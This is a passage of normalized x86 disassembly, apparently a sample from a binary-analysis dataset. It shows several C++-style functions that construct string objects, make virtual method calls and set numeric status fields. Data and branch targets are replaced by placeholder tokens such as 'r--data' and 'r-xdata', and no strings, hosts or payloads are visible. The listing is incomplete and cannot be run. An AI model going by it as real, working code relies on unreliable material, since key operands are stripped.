call sub_404233
push ebx
push edi
lea ecx [ ebp - 0x4c ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0x68 ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0xa0 ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x4 ] bl
call sub_40415f
mov edi esi
mov esi [ ebp - 0x30 ]
call sub_40d0c2
push ebx
push 0x1
mov ecx edi
call sub_40415f
call sub_425e60
retn
sub_40be60
push 0x5c
mov eax sub_43c233
call sub_425dad
xor edi edi
push 0x80
mov [ ebp - 0x10 ] edi
call sub_4246c6
pop ecx
mov [ ebp - 0x14 ] eax
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor esi esi
push r--data
lea ecx [ ebp - 0x4c ]
call sub_403dc1
mov [ ebp - 0x4 ] bl
push r--data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x10 ] ebx
call sub_403dc1
push edi
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x2
push eax
push [ ebp - 0x14 ]
mov [ ebp - 0x10 ] 0x3
call sub_41ec78
mov esi eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
push edi
push ebx
lea ecx [ ebp - 0x30 ]
call sub_40415f
test [ ebp - 0x10 ] 0x2
je r-xdata
push r--data
lea ecx [ ebp - 0x68 ]
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x5
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
push edi
push ebx
lea ecx [ ebp - 0x68 ]
call sub_40415f
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push esi
call [ eax + 0x14 ]
call sub_425e4c
retn 0x4
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_40415f
sub_40bf38
push 0x224
mov eax sub_43efd6
call sub_425e16
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
xor edi edi
mov [ ebp - 0x54 ] edi
push 0x80
mov [ ebp - 0x50 ] eax
mov [ eax + 0x438 ] ecx
call sub_4246c6
pop ecx
mov [ ebp - 0x4c ] eax
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
mov [ ebp - 0x4c ] edi
mov esi edi
push r--data
lea ecx [ ebp - 0x188 ]
call sub_403dc1
mov [ ebp - 0x4 ] bl
push r--data
lea ecx [ ebp - 0x16c ]
mov [ ebp - 0x54 ] ebx
call sub_403dc1
push edi
lea eax [ ebp - 0x188 ]
push eax
lea eax [ ebp - 0x16c ]
mov [ ebp - 0x4 ] 0x2
push eax
push [ ebp - 0x4c ]
mov [ ebp - 0x54 ] 0x3
call sub_41ec78
mov esi eax
mov [ ebp - 0x4c ] esi
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x54 ] bl
je r-xdata
and [ ebp - 0x54 ] 0xfffffffd
push edi
push ebx
lea ecx [ ebp - 0x16c ]
call sub_40415f
test [ ebp - 0x54 ] 0x2
je r-xdata
push r--data
lea ecx [ ebp - 0x2c ]
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x5
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
push edi
push ebx
lea ecx [ ebp - 0x2c ]
call sub_40415f
mov eax [ ebp + 0xc ]
cmp eax 0x100
je r-xdata
push edi
push ebx
lea ecx [ ebp - 0x188 ]
call sub_40415f
push r--data
lea ecx [ ebp - 0x118 ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0xe0 ]
mov [ ebp - 0x4 ] 0x6
call sub_403dc1
lea ecx [ ebp - 0x118 ]
push ecx
lea ecx [ ebp - 0xe0 ]
mov [ ebp - 0x4 ] 0x7
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
push edi
push ebx
lea ecx [ ebp - 0xe0 ]
call sub_40415f
lea ecx [ ebp - 0x118 ]
cmp eax 0x200
je r-xdata
push r--data
lea ecx [ ebp - 0xa8 ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x8c ]
mov [ ebp - 0x4 ] 0x8
call sub_403dc1
lea ecx [ ebp - 0xa8 ]
push ecx
lea ecx [ ebp - 0x8c ]
mov [ ebp - 0x4 ] 0x9
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
push edi
push ebx
lea ecx [ ebp - 0x8c ]
call sub_40415f
push edi
push ebx
lea ecx [ ebp - 0xa8 ]
call sub_40415f
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] 0xf
call sub_404490
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0xa
cmp [ eax + 0x104 ] edi
je r-xdata
cmp eax 0x400
je r-xdata
push edi
lea edi [ ebp - 0x2c ]
call sub_403fc6
mov eax [ ebp - 0x50 ]
push 0xffffffff
push 0x0
add eax 0x2c
mov esi edi
call sub_404233
push 0x0
call sub_403fc6
mov eax [ ebp - 0x50 ]
push 0xffffffff
xor edi edi
push edi
add eax 0x1c4
call sub_404233
mov edx esi
lea ecx [ ebp - 0x230 ]
call sub_4056ae
mov [ ebp - 0x4 ] 0xb
mov ecx [ ebp - 0x4c ]
mov edx [ ecx ]
push eax
call [ edx + 0x20 ]
push edi
push ebx
lea ecx [ ebp - 0x230 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push edi
push ebx
mov ecx esi
call sub_40415f
mov esi [ ebp - 0x4c ]
jmp r-xdata
push 0xffffffff
push edi
add eax 0x128
lea esi [ ebp - 0x2c ]
call sub_404233
push r--data
lea ecx [ ebp - 0x1a4 ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x134 ]
mov [ ebp - 0x4 ] 0xc
call sub_403dc1
lea ecx [ ebp - 0x1a4 ]
push ecx
lea ecx [ ebp - 0x134 ]
mov [ ebp - 0x4 ] 0xd
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
push edi
push ebx
lea ecx [ ebp - 0x134 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push edi
push ebx
lea ecx [ ebp - 0x1a4 ]
call sub_40415f
lea eax [ ebp - 0x1f8 ]
push eax
push [ ebp - 0x50 ]
call sub_40d136
mov [ ebp - 0x4 ] 0xe
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x20 ]
lea ecx [ ebp - 0x1f8 ]
jmp r-xdata
cmp eax 0x800
je r-xdata
mov ecx [ ebp - 0x50 ]
mov eax [ ecx ]
push esi
call [ eax + 0x14 ]
call sub_425e60
retn 0x8
or [ ebp - 0x4 ] 0xffffffff
push edi
push ebx
call sub_40415f
push r--data
lea ecx [ ebp - 0x70 ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0xfc ]
mov [ ebp - 0x4 ] 0xf
call sub_403dc1
lea ecx [ ebp - 0x70 ]
push ecx
lea ecx [ ebp - 0xfc ]
mov [ ebp - 0x4 ] 0x10
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
push edi
push ebx
lea ecx [ ebp - 0xfc ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push edi
push ebx
lea ecx [ ebp - 0x70 ]
call sub_40415f
mov eax [ ebp - 0x50 ]
cmp [ eax + 0x104 ] edi
je r-xdata
cmp eax 0x1000
jne r-xdata
lea edx [ eax + 0x80 ]
lea ecx [ ebp - 0x1dc ]
call sub_4056ae
mov [ ebp - 0x4 ] 0x12
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x20 ]
lea ecx [ ebp - 0x1dc ]
jmp r-xdata
lea edx [ eax + 0x128 ]
lea ecx [ ebp - 0x214 ]
call sub_4056ae
mov [ ebp - 0x4 ] 0x11
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x20 ]
lea ecx [ ebp - 0x214 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0x150 ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0x13
call sub_403dc1
lea ecx [ ebp - 0x150 ]
push ecx
lea ecx [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0x14
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
push edi
push ebx
lea ecx [ ebp - 0xc4 ]
call sub_40415f
push edi
push ebx
lea ecx [ ebp - 0x150 ]
call sub_40415f
push edi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x30 ] 0xf
call sub_404490
lea edx [ ebp - 0x48 ]
lea ecx [ ebp - 0x1c0 ]
mov [ ebp - 0x4 ] 0x15
call sub_4056ae
mov [ ebp - 0x4 ] 0x16
mov edx [ esi ]
push eax
mov ecx esi
call [ edx + 0x20 ]
push edi
push ebx
lea ecx [ ebp - 0x1c0 ]
call sub_40415f
lea ecx [ ebp - 0x48 ]
jmp r-xdata
sub_40c3a7
push 0x4a4
mov eax sub_43eeb2
call sub_425e16
mov edi ecx
xor ebx ebx
push 0x80
mov [ ebp - 0x17c ] edi
mov esi edx
mov [ ebp - 0x178 ] ebx
call sub_4246c6
pop ecx
mov [ ebp - 0x180 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
mov [ ebp - 0x180 ] ebx
push r--data
lea ecx [ ebp - 0x1e0 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x1
push r--data
lea ecx [ ebp - 0x288 ]
mov [ ebp - 0x178 ] 0x1
call sub_403dc1
push ebx
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0x288 ]
mov [ ebp - 0x4 ] 0x2
push eax
push [ ebp - 0x180 ]
mov [ ebp - 0x178 ] 0x3
call sub_41ec78
mov [ ebp - 0x180 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x178 ] 0x1
je r-xdata
and [ ebp - 0x178 ] 0xfffffffd
push ebx
push 0x1
lea ecx [ ebp - 0x288 ]
call sub_40415f
test [ ebp - 0x178 ] 0x2
je r-xdata
push r--data
lea ecx [ ebp - 0x234 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x5
mov ecx [ ebp - 0x180 ]
mov eax [ ecx ]
push rw-data
lea edx [ ebp - 0x234 ]
push edx
call [ eax + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x234 ]
call sub_40415f
mov edx esi
lea ecx [ ebp - 0x2c ]
call sub_405808
mov [ ebp - 0x4 ] 0x6
cmp [ edi + 0x438 ] 0x100
jne r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x1e0 ]
call sub_40415f
push [ ebp - 0x180 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x14 ]
push 0x7
push ebx
lea eax [ ebp - 0x2c ]
push eax
lea esi [ ebp - 0x4b0 ]
call sub_40ed02
push r--data
mov [ ebp - 0x4 ] 0x7
call sub_40563c
pop ecx
push ebx
push 0x1
mov ecx esi
mov [ ebp - 0x171 ] al
mov [ ebp - 0x4 ] 0x6
call sub_40415f
cmp [ ebp - 0x171 ] bl
jne r-xdata
push ebx
lea ecx [ ebp - 0xac ]
mov [ ebp - 0x94 ] 0xf
call sub_404490
push ebx
push r--data
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] 0x8
call sub_403eca
mov esi eax
cmp esi 0xffffffff
je r-xdata
push 0xffffffff
push ebx
add edi 0x48
push edi
lea ecx [ ebp - 0xac ]
call sub_40400a
lea edi [ esi + 0x7 ]
push edi
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sub_403eca
sub eax esi
sub eax 0x7
push eax
push edi
lea eax [ ebp - 0x2c ]
push eax
lea esi [ ebp - 0x478 ]
call sub_40ed02
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0x9
call sub_40400a
push ebx
push 0x1
mov ecx esi
mov [ ebp - 0x4 ] 0x8
call sub_40415f
jmp r-xdata
add eax 0x7
push eax
mov [ ebp - 0x184 ] eax
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sub_403eca
mov edi eax
push 0x1
lea eax [ edi - 0x1 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea esi [ ebp - 0x1a0 ]
call sub_40ed02
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0xac ]
call sub_40415f
jmp r-xdata
push ebx
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sub_403eca
mov [ ebp - 0x178 ] eax
cmp eax 0xffffffff
jne r-xdata
push r--data
mov [ ebp - 0x4 ] 0xa
call sub_40563c
pop ecx
push ebx
push 0x1
lea ecx [ ebp - 0x1a0 ]
mov [ ebp - 0x171 ] al
mov [ ebp - 0x4 ] 0x8
call sub_40415f
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x171 ] bl
jne r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
call sub_425e60
retn
inc edi
push edi
push r--data
push eax
call sub_403eca
mov edi eax
push 0x1
lea eax [ edi - 0x1 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea esi [ ebp - 0x1a0 ]
call sub_40ed02
sub edi [ ebp - 0x178 ]
lea esi [ ebp - 0x100 ]
sub edi 0x7
push edi
push [ ebp - 0x184 ]
push eax
call sub_40ed02
push ebx
lea ecx [ ebp - 0xe4 ]
mov [ ebp - 0xcc ] 0xf
call sub_404490
lea eax [ ebp - 0x360 ]
push eax
mov [ ebp - 0x4 ] 0xc
call sub_408d83
push 0x4
mov [ ebp - 0x4 ] 0xd
pop esi
mov eax [ ebp - 0x360 ]
mov eax [ eax + 0x4 ]
lea eax [ ebp + eax - 0x360 ]
mov ecx [ eax + 0x10 ]
and ecx 0xfffff9ff
or ecx 0x800
mov [ eax + 0x10 ] ecx
lea eax [ ebp - 0x1a8 ]
push 0x8
push eax
call sub_42335f
mov ecx [ ebp - 0x360 ]
mov ecx [ ecx + 0x4 ]
push [ eax + 0x4 ]
lea ecx [ ebp + ecx - 0x360 ]
push ecx
call [ eax ]
mov eax [ ebp - 0x360 ]
mov eax [ eax + 0x4 ]
lea eax [ ebp + eax - 0x360 ]
add esp 0x10
mov [ eax + 0x30 ] 0x30
call sub_424976
push eax
lea eax [ ebp - 0x360 ]
push eax
call sub_408a3e
dec esi
jne r-xdata
lea ecx [ ebp - 0x37c ]
lea eax [ ebp - 0x360 ]
call sub_408e2c
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0xe4 ]
mov [ ebp - 0x4 ] 0xe
call sub_40400a
push ebx
push 0x1
lea ecx [ ebp - 0x37c ]
call sub_40415f
lea eax [ ebp - 0x90 ]
mov [ ebp - 0x90 ] r--data
mov [ ebp - 0x34 ] bl
call sub_415b27
mov edi [ ebp - 0x17c ]
lea ecx [ edi + 0x2c ]
push eax
mov [ ebp - 0x4 ] 0xf
call sub_415b4f
mov esi r--data
push esi
lea ecx [ ebp - 0x26c ]
call sub_403dc1
lea eax [ ebp - 0x90 ]
push eax
lea ecx [ ebp - 0x26c ]
call sub_415b4f
push ebx
push 0x1
lea ecx [ ebp - 0x26c ]
call sub_40415f
lea eax [ ebp - 0x90 ]
push eax
lea ecx [ ebp - 0xac ]
call sub_415b4f
push esi
lea ecx [ ebp - 0x2a4 ]
call sub_403dc1
lea eax [ ebp - 0x90 ]
push eax
lea ecx [ ebp - 0x2a4 ]
call sub_415b4f
push ebx
push 0x1
lea ecx [ ebp - 0x2a4 ]
call sub_40415f
lea eax [ ebp - 0x90 ]
lea ecx [ edi + 0x1c4 ]
push eax
call sub_415b4f
lea esi [ ebp - 0x90 ]
call sub_415c2c
lea edi [ ebp - 0x11c ]
mov ecx esi
call sub_415d25
mov eax esi
mov [ ebp - 0x4 ] 0x10
call sub_415b27
push eax
mov ecx edi
call sub_415b4f
mov esi r--data
push esi
lea ecx [ ebp - 0x218 ]
call sub_403dc1
lea eax [ ebp - 0x90 ]
push eax
lea ecx [ ebp - 0x218 ]
call sub_415b4f
xor edi edi
push ebx
inc edi
push edi
lea ecx [ ebp - 0x218 ]
call sub_40415f
lea eax [ ebp - 0x90 ]
push eax
lea ecx [ ebp - 0x100 ]
call sub_415b4f
push esi
lea ecx [ ebp - 0x2dc ]
call sub_403dc1
lea eax [ ebp - 0x90 ]
push eax
lea ecx [ ebp - 0x2dc ]
call sub_415b4f
push ebx
push edi
lea ecx [ ebp - 0x2dc ]
call sub_40415f
lea eax [ ebp - 0x90 ]
push eax
lea ecx [ ebp - 0xe4 ]
call sub_415b4f
lea esi [ ebp - 0x90 ]
call sub_415c2c
lea eax [ ebp - 0x138 ]
push eax
mov ecx esi
call sub_415ca9
mov eax esi
mov [ ebp - 0x4 ] 0x11
call sub_415b27
push r--data
lea ecx [ ebp - 0x1fc ]
call sub_403dc1
mov eax esi
push eax
lea ecx [ ebp - 0x1fc ]
call sub_415b4f
push ebx
push edi
lea ecx [ ebp - 0x1fc ]
call sub_40415f
mov ecx [ ebp - 0x17c ]
mov eax esi
add ecx 0x48
push eax
call sub_415b4f
call sub_415c2c
lea eax [ ebp - 0x154 ]
push eax
mov ecx esi
call sub_415ca9
mov eax esi
mov [ ebp - 0x4 ] 0x12
call sub_415b27
push eax
lea ecx [ ebp - 0x138 ]
call sub_415b4f
push r--data
lea ecx [ ebp - 0x1c4 ]
call sub_403dc1
mov eax esi
push eax
lea ecx [ ebp - 0x1c4 ]
call sub_415b4f
push ebx
push edi
lea ecx [ ebp - 0x1c4 ]
call sub_40415f
mov eax esi
push eax
lea ecx [ ebp - 0x100 ]
call sub_415b4f
push r--data
lea ecx [ ebp - 0x250 ]
call sub_403dc1
mov eax esi
push eax
lea ecx [ ebp - 0x250 ]
call sub_415b4f
push ebx
push edi
lea ecx [ ebp - 0x250 ]
call sub_40415f
mov eax esi
push eax
lea ecx [ ebp - 0xe4 ]
call sub_415b4f
push r--data
lea ecx [ ebp - 0x2c0 ]
call sub_403dc1
mov eax esi
push eax
lea ecx [ ebp - 0x2c0 ]
call sub_415b4f
push ebx
push edi
lea ecx [ ebp - 0x2c0 ]
call sub_40415f
mov eax esi
push eax
lea ecx [ ebp - 0x154 ]
call sub_415b4f
call sub_415c2c
lea eax [ ebp - 0x170 ]
push eax
mov ecx esi
call sub_415ca9
mov eax [ ebp - 0x17c ]
add eax 0x2c
push eax
lea eax [ ebp - 0x494 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x13
call sub_40f984
add esp 0xc
push r--data
push eax
lea eax [ ebp - 0x3b4 ]
push eax
mov [ ebp - 0x4 ] 0x14
call sub_40f9cf
add esp 0xc
lea ecx [ ebp - 0xac ]
push ecx
push eax
lea eax [ ebp - 0xc8 ]
push eax
mov [ ebp - 0x4 ] 0x15
call sub_40fa15
add esp 0xc
push ebx
push edi
lea ecx [ ebp - 0x3b4 ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0x494 ]
mov [ ebp - 0x4 ] 0x18
call sub_40415f
lea eax [ ebp - 0x100 ]
push eax
lea eax [ ebp - 0x424 ]
push r--data
push eax
call sub_40f984
add esp 0xc
push r--data
push eax
lea eax [ ebp - 0x45c ]
push eax
mov [ ebp - 0x4 ] 0x19
call sub_40f9cf
add esp 0xc
lea ecx [ ebp - 0xe4 ]
push ecx
push eax
lea eax [ ebp - 0x3ec ]
push eax
mov [ ebp - 0x4 ] 0x1a
call sub_40fa15
add esp 0xc
push 0xffffffff
push ebx
lea esi [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] 0x1b
call sub_404233
push ebx
push edi
lea ecx [ ebp - 0x3ec ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0x45c ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0x424 ]
mov [ ebp - 0x4 ] 0x18
call sub_40415f
mov eax [ ebp - 0x17c ]
add eax 0x48
push eax
lea eax [ ebp - 0x3d0 ]
push r--data
push eax
call sub_40f984
add esp 0xc
push r--data
push eax
lea eax [ ebp - 0x398 ]
push eax
mov [ ebp - 0x4 ] 0x1c
call sub_40f9cf
add esp 0xc
push 0xffffffff
push ebx
mov [ ebp - 0x4 ] 0x1d
call sub_404233
push ebx
push edi
lea ecx [ ebp - 0x398 ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0x3d0 ]
mov [ ebp - 0x4 ] 0x18
call sub_40415f
push 0xffffffff
push ebx
lea eax [ ebp - 0x170 ]
call sub_404233
push r--data
mov eax esi
push eax
call sub_403fa5
mov eax [ ebp - 0x17c ]
cmp [ eax + 0x104 ] ebx
je r-xdata
lea edx [ ebp - 0xc8 ]
lea ecx [ ebp - 0x440 ]
call sub_4056ae
mov [ ebp - 0x4 ] 0x1f
mov ecx [ ebp - 0x180 ]
mov edx [ ecx ]
push eax
call [ edx + 0x20 ]
push ebx
push edi
lea ecx [ ebp - 0x440 ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0xc8 ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0x170 ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0x154 ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0x138 ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0x11c ]
call sub_40415f
lea eax [ ebp - 0x360 ]
mov [ ebp - 0x4 ] 0xc
call sub_408986
push ebx
push edi
lea ecx [ ebp - 0xe4 ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0x100 ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0x6
call sub_40415f
mov edi [ ebp - 0x17c ]
add eax 0x128
push eax
lea eax [ ebp - 0x408 ]
push r--data
push eax
call sub_40f984
add esp 0xc
push 0xffffffff
push ebx
mov [ ebp - 0x4 ] 0x1e
call sub_404233
push ebx
push edi
lea ecx [ ebp - 0x408 ]
mov [ ebp - 0x4 ] 0x18
call sub_40415f
sub_40cc7f
push ebp
sub esp 0x70
push 0x38
mov eax sub_43b19b
call sub_425dad
mov esi r--data
push esi
lea ecx [ ebp + 0x54 ]
call sub_403dc1
xor ebx ebx
push esi
lea ecx [ ebp + 0x38 ]
mov [ ebp - 0x4 ] ebx
call sub_403dc1
push r--data
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x1
call sub_403dc1
lea ecx [ ebp + 0x54 ]
push ecx
lea ecx [ ebp + 0x38 ]
push ecx
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x2
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x50 ]
push ebx
push 0x1
lea ecx [ ebp + 0x1c ]
mov [ ebp + 0x73 ] al
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp + 0x38 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp + 0x54 ]
call sub_40415f
cmp [ ebp + 0x73 ] bl
je r-xdata
push esi
lea ecx [ ebp + 0x1c ]
call sub_403dc1
push esi
lea ecx [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0x3
call sub_403dc1
push r--data
lea ecx [ ebp + 0x54 ]
mov [ ebp - 0x4 ] 0x4
call sub_403dc1
lea ecx [ ebp + 0x1c ]
push ecx
lea ecx [ ebp + 0x38 ]
push ecx
lea ecx [ ebp + 0x54 ]
mov [ ebp - 0x4 ] 0x5
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x50 ]
push ebx
push 0x1
lea ecx [ ebp + 0x54 ]
mov [ ebp + 0x73 ] al
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp + 0x38 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp + 0x1c ]
call sub_40415f
cmp [ ebp + 0x73 ] bl
je r-xdata
mov eax [ ebp + 0x7c ]
mov [ eax + 0x3ac ] 0x1
jmp r-xdata
push esi
lea ecx [ ebp + 0x1c ]
call sub_403dc1
push esi
lea ecx [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0x6
call sub_403dc1
push r--data
lea ecx [ ebp + 0x54 ]
mov [ ebp - 0x4 ] 0x7
call sub_403dc1
lea ecx [ ebp + 0x1c ]
push ecx
lea ecx [ ebp + 0x38 ]
push ecx
lea ecx [ ebp + 0x54 ]
mov [ ebp - 0x4 ] 0x8
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x50 ]
push ebx
push 0x1
lea ecx [ ebp + 0x54 ]
mov [ ebp + 0x73 ] al
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp + 0x38 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp + 0x1c ]
call sub_40415f
cmp [ ebp + 0x73 ] bl
je r-xdata
mov eax [ ebp + 0x7c ]
mov [ eax + 0x3ac ] 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add ebp 0x74
leave
retn 0x4
push esi
lea ecx [ ebp + 0x1c ]
call sub_403dc1
push esi
lea ecx [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0x9
call sub_403dc1
push r--data
lea ecx [ ebp + 0x54 ]
mov [ ebp - 0x4 ] 0xa
call sub_403dc1
lea ecx [ ebp + 0x1c ]
push ecx
lea ecx [ ebp + 0x38 ]
push ecx
lea ecx [ ebp + 0x54 ]
mov [ ebp - 0x4 ] 0xb
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x50 ]
push ebx
push 0x1
lea ecx [ ebp + 0x54 ]
mov [ ebp + 0x73 ] al
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp + 0x38 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp + 0x1c ]
call sub_40415f
cmp [ ebp + 0x73 ] bl
je r-xdata
mov eax [ ebp + 0x7c ]
mov [ eax + 0x3ac ] 0x3
jmp r-xdata
push esi
lea ecx [ ebp + 0x1c ]
call sub_403dc1
push esi
lea ecx [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0xc
call sub_403dc1
push r--data
lea ecx [ ebp + 0x54 ]
mov [ ebp - 0x4 ] 0xd
call sub_403dc1
lea ecx [ ebp + 0x1c ]
push ecx
lea ecx [ ebp + 0x38 ]
push ecx
lea ecx [ ebp + 0x54 ]
mov [ ebp - 0x4 ] 0xe
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x50 ]
push ebx
push 0x1
lea ecx [ ebp + 0x54 ]
mov [ ebp + 0x73 ] al
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp + 0x38 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp + 0x1c ]
call sub_40415f
cmp [ ebp + 0x73 ] bl
je r-xdata
mov eax [ ebp + 0x7c ]
mov [ eax + 0x3ac ] 0x4
jmp r-xdata
push esi
lea ecx [ ebp + 0x1c ]
call sub_403dc1
push esi
lea ecx [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0xf
call sub_403dc1
push r--data
lea ecx [ ebp + 0x54 ]
mov [ ebp - 0x4 ] 0x10
call sub_403dc1
lea ecx [ ebp + 0x1c ]
push ecx
lea ecx [ ebp + 0x38 ]
push ecx
lea ecx [ ebp + 0x54 ]
mov [ ebp - 0x4 ] 0x11
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x50 ]
push ebx
push 0x1
lea ecx [ ebp + 0x54 ]
mov [ ebp + 0x73 ] al
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp + 0x38 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp + 0x1c ]
call sub_40415f
cmp [ ebp + 0x73 ] bl
je r-xdata
mov eax [ ebp + 0x7c ]
mov [ eax + 0x3ac ] 0x5
jmp r-xdata
push esi
lea ecx [ ebp - 0x44 ]
call sub_403dc1
push esi
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x12
call sub_403dc1
push r--data
lea ecx [ ebp ]
mov [ ebp - 0x4 ] 0x13
call sub_403dc1
lea ecx [ ebp - 0x44 ]
push ecx
lea ecx [ ebp - 0x28 ]
push ecx
lea ecx [ ebp ]
mov [ ebp - 0x4 ] 0x14
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x50 ]
push ebx
push 0x1
lea ecx [ ebp ]
mov [ ebp + 0x73 ] al
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp - 0x44 ]
call sub_40415f
cmp [ ebp + 0x73 ] bl
je r-xdata
mov eax [ ebp + 0x7c ]
mov [ eax + 0x3ac ] 0x6
jmp r-xdata
mov eax [ ebp + 0x7c ]
mov [ eax + 0x3ac ] 0x7
sub_40d01b
push 0x1c
mov eax sub_43c2f7
call sub_425dad
mov esi ecx
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
call sub_425e4c
retn 0x4
mov eax [ ebx ]
lea ecx [ ebp - 0x28 ]
push ecx
mov ecx ebx
call [ eax + 0x4 ]
and [ ebp - 0x4 ] 0x0
mov edi eax
call sub_40d0c2
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_40415f
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x60 ]
dec eax
je r-xdata
